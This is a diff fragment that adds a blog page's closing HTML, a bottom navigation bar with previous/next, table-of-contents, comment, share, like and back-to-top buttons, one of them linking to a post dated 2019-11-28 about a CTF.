+  <div class="bottom-bar-left">
+    <a href="javascript:void(0);" data-enable="false">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/11/28/2019-11-28-CTF/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+      <a href="javascript:void(0);" id="site-reward">
+        <i class="fa fa-thumbs-up"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
